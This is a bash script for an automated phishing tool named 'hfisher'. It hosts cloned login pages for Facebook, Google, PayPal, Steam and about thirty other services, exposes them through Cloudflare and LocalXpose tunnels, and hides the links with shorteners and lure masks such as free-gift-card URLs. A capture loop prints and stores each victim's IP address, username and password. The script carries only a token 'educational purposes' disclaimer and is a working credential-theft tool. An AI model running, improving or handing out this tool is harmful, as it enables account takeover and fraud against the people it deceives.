#!/bin/bash
# shellcheck disable=SC2034,SC2155,SC2059
##   hfisher 	: 	Automated Phishing Tool
##   Author 	: 	imshown
##   Version 	: 	1.0.5
##   Github 	: 	https://github.com/hsecurities/hfisher
##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##    [... License Preamble remains the same ...]
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2024  hsecurities (https://github.com/hsecurities)
##
__version__="1.0.5"
HOST='127.0.0.1'
PORT='8080'

# --- Fixed Color Variables ---
# Corrected duplicate and misnamed color codes.
RED="$(printf '\033[31m')"    GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"   WHITE="$(printf '\033[37m')"  BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"    GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"   WHITEBG="$(printf '\033[47m')"  BLACKBG="$(printf '\033[40m')"
RESET="$(printf '\033[0m')"
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

# --- Initial Setup ---
# Create necessary directories if they don't exist
mkdir -p ".server" "auth"

# Clean up previous session files
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
fi
mkdir -p ".server/www"

rm -f ".server/.loclx" ".server/.cld.log"

# --- Fixed Signal Traps ---
# Now correctly terminates background processes (PHP, Cloudflared, etc.) on exit.
exit_on_signal_SIGINT() {
	echo -e "\n\n${RED}[${WHITE}!${RED}]${CYAN} Program Interrupted. Cleaning up...${RESET}"
	kill_pid
	exit 1
}

exit_on_signal_SIGTERM() {
	echo -e "\n\n${RED}[${WHITE}!${RED}]${CYAN} Program Terminated. Cleaning up...${RESET}"
	kill_pid
	exit 1
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
	tput sgr0
	tput op
}

kill_pid() {
    # Using an array for clarity
	local check_pids=("php" "cloudflared" "loclx")
	for process in "${check_pids[@]}"; do
		if pgrep -x "$process" >/dev/null; then
			killall "$process" >/dev/null 2>&1
		fi
	done
}

check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update...${RESET}"
	# Fixed typo in variable name: relase_url -> release_url
	local release_url='https://api.github.com/repos/hsecurities/hfisher/releases/latest'
	local new_version
	new_version=$(curl -s "${release_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	
	if [[ -n "$new_version" && "$new_version" != "$__version__" ]]; then
		echo -e "${ORANGE} Update found! [${GREEN}${new_version}${ORANGE}]${RESET}"
		sleep 1
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Downloading update...${RESET}"
		local tarball_url="https://github.com/hsecurities/hfisher/archive/refs/tags/${new_version}.tar.gz"
		
		pushd "$HOME" > /dev/null 2>&1
		if curl --silent --insecure --fail --retry-connrefused --retry 3 --retry-delay 2 --location --output ".hfisher.tar.gz" "${tarball_url}"; then
			tar -zxf .hfisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			if [[ $? -ne 0 ]]; then
				echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occurred while extracting.${RESET}"
				popd > /dev/null 2>&1
				exit 1
			fi
			rm -f .hfisher.tar.gz
			popd > /dev/null 2>&1
			
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Successfully updated! Please run hfisher again.${RESET}\n"
			exit 0
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occurred while downloading update.${RESET}"
			popd > /dev/null 2>&1
			exit 1
		fi
	else
		echo -e "${GREEN} up to date.${RESET}" ; sleep .5
	fi
}

check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status: ${RESET}"
	if timeout 3s curl -fIs "https://api.github.com" > /dev/null; then
		echo -e "${GREEN}Online${RESET}"
		check_update
	else
		echo -e "${RED}Offline${RESET}"
	fi
}

banner() {
	cat <<- EOF
		${BLUE}
		${BLUE}.__    ___________.__       .__
		${BLUE}|  |__ \_   _____/|__| _____|  |__   ___________
		${BLUE}|  |  \ |    __)  |  |/  ___/  |  \_/ __ \_  __ \
		${BLUE}|   Y  \|     \   |  |\___ \|   Y  \  ___/|  | \/
		${BLUE}|___|  /\___  /   |__/____  >___|  /\___  >__|
		${BLUE}\/     \/            \/     \/     \/ ${RED}Version: ${__version__}
		${GREEN}[${WHITE}-${BLUE}]${RED} Tool Created by hsecurities (imshown)${WHITE}
	EOF
}

banner_small() {
	cat <<- EOF
		${RED}
		${RED}       (
    	${RED})  )\ )             ) ${BLUE} ${__version__}
 		${RED}( /( (()/(  (       ( /(    (   (
 		${RED})\()) /(_)) )\  (   )\())  ))\  )(
		${RED}((_)\ (_))_|((_) )\ ((_)\  /((_)(()\
		${RED}| |(_)| |_   (_)((_)| |(_)(_))   ((_)
		${RED}| ' \ | __|  | |(_-<| ' \ / -_) | '_|
		${RED}|_||_||_|    |_|/__/|_||_|\___| |_|
	EOF
}

dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${ORANGE}]${CYAN} Checking for required packages...${RESET}"

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if ! command -v proot &>/dev/null; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}proot${RESET}"
			pkg install proot resolv-conf -y
		fi

		if ! command -v tput &>/dev/null; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}ncurses-utils${RESET}"
			pkg install ncurses-utils -y
		fi
	fi
    # Using an array for package list
	local pkgs=("php" "curl" "unzip")
	local not_installed=()
	for pkg in "${pkgs[@]}"; do
		if ! command -v "$pkg" &>/dev/null; then
			not_installed+=("$pkg")
		fi
	done

	if [[ ${#not_installed[@]} -eq 0 ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} All packages are already installed.${RESET}"
	else
		echo -e "\n${GREEN}[${WHITE}+${ORANGE}]${CYAN} Installing missing packages: ${ORANGE}${not_installed[*]}${RESET}"
		for pkg in "${not_installed[@]}"; do
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package: ${ORANGE}$pkg${RESET}"
			if command -v pkg &>/dev/null; then
				pkg install "$pkg" -y
			elif command -v apt &>/dev/null; then
				sudo apt install "$pkg" -y
			elif command -v apt-get &>/dev/null; then
				sudo apt-get install "$pkg" -y
			elif command -v pacman &>/dev/null; then
				sudo pacman -S "$pkg" --noconfirm
			elif command -v dnf &>/dev/null; then
				sudo dnf -y install "$pkg"
			elif command -v yum &>/dev/null; then
				sudo yum -y install "$pkg"
			else
				echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager. Please install packages manually: ${not_installed[*]}${RESET}"
				exit 1
			fi
		done
	fi
}

download() {
	local url="$1"
	local output="$2"
	local file
	file=$(basename "$url")
	
	# Clean up old files
	rm -f "$file" "$output"

	echo -ne "${GREEN}[${WHITE}+${GREEN}]${CYAN} Downloading ${ORANGE}$output${CYAN}...${RESET}"
	if ! curl --silent --insecure --fail --retry-connrefused --retry 3 --retry-delay 2 --location --output "${file}" "${url}"; then
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occurred while downloading ${output}.${RESET}"
		exit 1
	fi
    echo -e "${GREEN} Done.${RESET}"

	if [[ ${file##*.} == "zip" ]]; then
		unzip -qq "$file"
		# Move the extracted binary, not the folder
        local extracted_file=$(unzip -l "$file" | awk '/\/$/ {next} {print $NF}' | tail -n 1)
		mv -f "$extracted_file" ".server/$output"
	elif [[ ${file##*.} == "tgz" ]]; then
		tar -zxf "$file"
		mv -f "$output" ".server/$output"
	else
		mv -f "$file" ".server/$output"
	fi
	
	chmod +x ".server/$output"
	rm -f "$file"
}

install_cloudflared() {
	if [[ -f ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared is already installed.${RESET}"
	else
		echo -e "\n${GREEN}[${WHITE}+${ORANGE}]${CYAN} Installing Cloudflared...${RESET}"
		local arch
		arch=$(uname -m)
		if [[ "$arch" == *'arm'* || "$arch" == *'Android'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

install_localxpose() {
	if [[ -f ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose is already installed.${RESET}"
	else
		echo -e "\n${GREEN}[${WHITE}+${ORANGE}]${CYAN} Installing LocalXpose...${RESET}"
		local arch
		arch=$(uname -m)
		if [[ "$arch" == *'arm'* || "$arch" == *'Android'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

msg_exit() {
	clear; banner
	echo -e "\n${GREENBG}${BLACK} Thank you for using this tool. Have a good day. ${RESET}\n"
	kill_pid
	exit 0
}

about() {
	clear; banner; echo
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}imshown ${CYAN}[${ORANGE}hsecurities${CYAN}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/hsecurities
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESET}
		${CYAN}  This Tool is for educational purposes only!
		  The author will not be responsible for any misuse of this toolkit.

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice
	case "$choice" in
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu...${RESET}"
			sleep 1; main_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"
			sleep 1; about;;
	esac
}

cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want a custom port? [${GREEN}y${ORANGE}/${GREEN}N${ORANGE}]: ${CYAN}" P_ANS
	if [[ "${P_ANS}" =~ ^[yY]$ ]]; then
		echo -e "\n"
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your custom 4-digit port [1024-9999]: ${WHITE}" CU_P
		if [[ "$CU_P" =~ ^[0-9]{4}$ && "$CU_P" -ge 1024 ]]; then
			PORT="$CU_P"
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit port: $CU_P. Try again...${RESET}"
			sleep 2; clear; banner_small; cusport
		fi
	else
		echo -e "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using default port ${ORANGE}$PORT${BLUE}...${RESET}\n"
	fi
}

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server...${RESET}"
	cp -rf ".sites/$website"/* .server/www/
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...${RESET}"
    # Added error handling for cd
	cd .server/www || { echo -e "\n${RED}[!] Failed to change directory.${RESET}"; exit 1; }
	php -S "$HOST":"$PORT" > /dev/null 2>&1 &
	cd ../..
}

capture_ip() {
	IP=$(grep -o 'IP: .*' .server/www/ip.txt | cut -d' ' -f2)
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP: ${BLUE}$IP${RESET}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/ip.txt${RESET}"
	cat .server/www/ip.txt >> auth/ip.txt
	echo -e "\n" >> auth/ip.txt
}

capture_creds() {
	ACCOUNT=$(grep 'Username:' .server/www/usernames.txt | awk -F': ' '{print $2}')
	PASSWORD=$(grep 'Pass:' .server/www/usernames.txt | awk -F': ' '{print $2}')
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account: ${BLUE}$ACCOUNT${RESET}"
	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}$PASSWORD${RESET}"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/usernames.dat${RESET}"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -e "\n----------------------------------------\n" >> auth/usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for next login. ${CYAN}(Ctrl + C to exit)${RESET}"
}

capture_data() {
	echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for credentials... ${CYAN}(Ctrl + C to exit)${RESET}"
	while true; do
		if [[ -f ".server/www/ip.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Victim IP captured!${RESET}"
			capture_ip
			rm -f .server/www/ip.txt
		fi
		if [[ -f ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Login credentials captured!${RESET}"
			capture_creds
			rm -f .server/www/usernames.txt
		fi
		sleep 1
	done
}

start_cloudflared() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${ORANGE}(http://$HOST:$PORT)${RESET}"
	setup_site
	
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared...${RESET}"
    # Fixed `command -v` check and log file path
	if command -v termux-chroot &>/dev/null; then
		termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	# Polling for URL instead of fixed sleep
    echo -ne "${CYAN}Waiting for Cloudflared URL...${RESET}"
    cldflr_url=""
    for _ in {1..15}; do
        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
        if [[ -n "$cldflr_url" ]]; then
            echo -e "${GREEN} Done.${RESET}"
            break
        fi
        echo -n "."
        sleep 1
    done
    
    if [[ -z "$cldflr_url" ]]; then
        echo -e "\n${RED}[!] Cloudflared failed to generate a URL. Check logs at .server/.cld.log${RESET}"
        kill_pid
        exit 1
    fi

	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	local auth_f
	if [[ -d "$HOME/.localxpose" ]]; then
	    auth_f="$HOME/.localxpose/.access"
	else
	    # Fallback for non-standard setups
	    mkdir -p ".localxpose"
	    auth_f=".localxpose/.access"
	fi
	
	# Check if authenticated
	if ./.server/loclx account status | grep -q "Error"; then
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy your auth token.${RESET}\n"
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input LocalXpose Auth Token: ${WHITE}" loclx_token
		if [[ -z "$loclx_token" ]]; then
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} An auth token is required.${RESET}" ; sleep 2 ; tunnel_menu
		else
            # Quoted variable for safety
			echo -n "$loclx_token" > "$auth_f"
			echo -e "${GREEN}Token saved.${RESET}"
		fi
	fi
}

start_loclx() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${ORANGE}(http://$HOST:$PORT)${RESET}"
	setup_site
	localxpose_auth
	
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx server region to EU? [${GREEN}y${ORANGE}/${GREEN}N${ORANGE}]: ${CYAN}" opinion
	local loclx_region="us"
	[[ "${opinion,,}" == "y" ]] && loclx_region="eu"
	
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose...${RESET}"
    # Fixed `command -v` check
	if command -v termux-chroot &>/dev/null; then
		termux-chroot ./.server/loclx tunnel --raw-mode http --region "${loclx_region}" --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		./.server/loclx tunnel --raw-mode http --region "${loclx_region}" --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

    # Polling for URL
    echo -ne "${CYAN}Waiting for LocalXpose URL...${RESET}"
    loclx_url=""
    for _ in {1..20}; do
        # Fixed "Useless use of cat"
        loclx_url=$(grep -o '[0-9a-zA-Z.]*.loclx.io' .server/.loclx)
        if [[ -n "$loclx_url" ]]; then
            echo -e "${GREEN} Done.${RESET}"
            break
        fi
        echo -n "."
        sleep 1
    done

    if [[ -z "$loclx_url" ]]; then
        echo -e "\n${RED}[!] LocalXpose failed to generate a URL. Check logs at .server/.loclx${RESET}"
        kill_pid
        exit 1
    fi
    
	custom_url "$loclx_url"
	capture_data
}

start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${ORANGE}(http://$HOST:$PORT)${RESET}"
	setup_site
	clear; banner_small
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully hosted at: ${ORANGE}http://$HOST:$PORT${RESET}"
	capture_data
}

tunnel_menu() {
	clear; banner_small
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${CYAN}[Best]${RESET}
		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${CYAN}[Needs Account]${RESET}

	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service: ${BLUE}" choice
	case "$choice" in
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"
			sleep 1; tunnel_menu;;
	esac
}

custom_mask() {
	sleep .5; clear; banner_small; echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to use a custom mask URL? [${GREEN}y${ORANGE}/${GREEN}N${ORANGE}]: ${CYAN}" mask_op
	echo
	if [[ "${mask_op,,}" == "y" ]]; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL ${RED}(e.g., https://get-free-followers.com)${RESET}\n"
		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
        # --- Fixed URL Validation ---
        # Simplified to be more reliable.
		if [[ "$mask_url" == "https://"* || "$mask_url" == "http://"* ]]; then
			mask="$mask_url"
			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom masked URL: ${GREEN}$mask${RESET}"
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid URL format. Using default mask...${RESET}"
			sleep 2
		fi
	fi
}

# Check if a URL shortener service is online
site_stat() {
    curl -s -o /dev/null -w "%{http_code}" "$1"
}

shorten() {
    local service_url="$1"
    local target_url="$2"
	local short
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "${service_url}${target_url}")
	if [[ "$service_url" == *"shrtco.de"* ]]; then
		processed_url=$(echo "$short" | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		processed_url=${short#*//}
	fi
}

custom_url() {
	local url="$1"
	local isgd="https://is.gd/create.php?format=simple&url="
	local shortcode="https://api.shrtco.de/v2/shorten?url="
	local tinyurl="https://tinyurl.com/api-create.php?url="
	
	custom_mask
	sleep 1; clear; banner_small
	
	local processed_url="Unable to Shorten URL"
	if [[ "$url" =~ (trycloudflare.com|loclx.io) ]]; then
        echo -ne "${CYAN}Shortening URL...${RESET}"
		if [[ $(site_stat "${isgd}google.com") == 2* ]]; then
			shorten "$isgd" "$url"
		elif [[ $(site_stat "${shortcode}google.com") == 2* ]]; then
			shorten "$shortcode" "$url"
		else
			shorten "$tinyurl" "$url"
		fi
        echo -e "${GREEN} Done.${RESET}"
		
        if [[ -n "$processed_url" ]]; then
            masked_url="${mask}-${processed_url//./-}.com" # A more convincing mask format
            processed_url="https://$processed_url"
        fi
	else
		url="Could not generate link. Is the tunnel running?"
	fi
	
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1: ${GREEN}$url"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} URL 2: ${ORANGE}$processed_url"
	[[ "$processed_url" != "Unable to Shorten URL" ]] && echo -e "${RED}[${WHITE}-${RED}]${BLUE} Masked: ${CYAN}$masked_url${RESET}"
}

# --- Menu Functions ---

site_facebook() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice
	case "$choice" in
		1 | 01) website="facebook"; mask='https://blue-verified-badge-for-facebook-free'; tunnel_menu;;
		2 | 02) website="fb_advanced"; mask='https://vote-for-the-best-social-media'; tunnel_menu;;
		3 | 03) website="fb_security"; mask='https://make-your-facebook-secured-and-free-from-hackers'; tunnel_menu;;
		4 | 04) website="fb_messenger"; mask='https://get-messenger-premium-features-free'; tunnel_menu;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"; sleep 1; clear; banner_small; site_facebook;;
	esac
}

site_instagram() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice
	case "$choice" in
		1 | 01) website="instagram"; mask='https://get-unlimited-followers-for-instagram'; tunnel_menu;;
		2 | 02) website="ig_followers"; mask='https://get-unlimited-followers-for-instagram'; tunnel_menu;;
		3 | 03) website="insta_followers"; mask='https://get-1000-followers-for-instagram'; tunnel_menu;;
		4 | 04) website="ig_verify"; mask='https://blue-badge-verify-for-instagram-free'; tunnel_menu;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"; sleep 1; clear; banner_small; site_instagram;;
	esac
}

site_gmail() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice
	case "$choice" in
		1 | 01) website="google"; mask='https://get-unlimited-google-drive-free'; tunnel_menu;;
		2 | 02) website="google_new"; mask='https://get-unlimited-google-drive-free'; tunnel_menu;;
		3 | 03) website="google_poll"; mask='https://vote-for-the-best-social-media'; tunnel_menu;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"; sleep 1; clear; banner_small; site_gmail;;
	esac
}

site_vk() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice
	case "$choice" in
		1 | 01) website="vk"; mask='https://vk-premium-real-method-2020'; tunnel_menu;;
		2 | 02) website="vk_poll"; mask='https://vote-for-the-best-social-media'; tunnel_menu;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"; sleep 1; clear; banner_small; site_vk;;
	esac
}

main_menu() {
	clear; banner; echo
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackOverflow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice
	case "$choice" in
		1 | 01) site_facebook;;
		2 | 02) site_instagram;;
		3 | 03) site_gmail;;
		4 | 04) website="microsoft"; mask='https://unlimited-onedrive-space-for-free'; tunnel_menu;;
		5 | 05) website="netflix"; mask='https://upgrade-your-netflix-plan-free'; tunnel_menu;;
		6 | 06) website="paypal"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		7 | 07) website="steam"; mask='https://steam-500-usd-gift-card-free'; tunnel_menu;;
		8 | 08) website="twitter"; mask='https://get-blue-badge-on-twitter-free'; tunnel_menu;;
		9 | 09) website="playstation"; mask='https://playstation-500-usd-gift-card-free'; tunnel_menu;;
		10) website="tiktok"; mask='https://tiktok-free-liker'; tunnel_menu;;
		11) website="twitch"; mask='https://unlimited-twitch-tv-user-for-free'; tunnel_menu;;
		12) website="pinterest"; mask='https://get-a-premium-plan-for-pinterest-free'; tunnel_menu;;
		13) website="snapchat"; mask='https://view-locked-snapchat-accounts-secretly'; tunnel_menu;;
		14) website="linkedin"; mask='https://get-a-premium-plan-for-linkedin-free'; tunnel_menu;;
		15) website="ebay"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		16) website="quora"; mask='https://quora-premium-for-free'; tunnel_menu;;
		17) website="protonmail"; mask='https://protonmail-pro-basics-for-free'; tunnel_menu;;
		18) website="spotify"; mask='https://convert-your-account-to-spotify-premium'; tunnel_menu;;
		19) website="reddit"; mask='https://reddit-official-verified-member-badge'; tunnel_menu;;
		20) website="adobe"; mask='https://get-adobe-lifetime-pro-membership-free'; tunnel_menu;;
		21) website="deviantart"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		22) website="badoo"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		23) website="origin"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		24) website="dropbox"; mask='https://get-1TB-cloud-storage-free'; tunnel_menu;;
		25) website="yahoo"; mask='https://grab-mail-from-anyother-yahoo-account-free'; tunnel_menu;;
		26) website="wordpress"; mask='https://unlimited-wordpress-traffic-free'; tunnel_menu;;
		27) website="yandex"; mask='https://grab-mail-from-anyother-yandex-account-free'; tunnel_menu;;
		28) website="stackoverflow"; mask='https://get-stackoverflow-lifetime-pro-membership-free'; tunnel_menu;;
		29) site_vk;;
		30) website="xbox"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
		31) website="mediafire"; mask='https://get-1TB-on-mediafire-free'; tunnel_menu;;
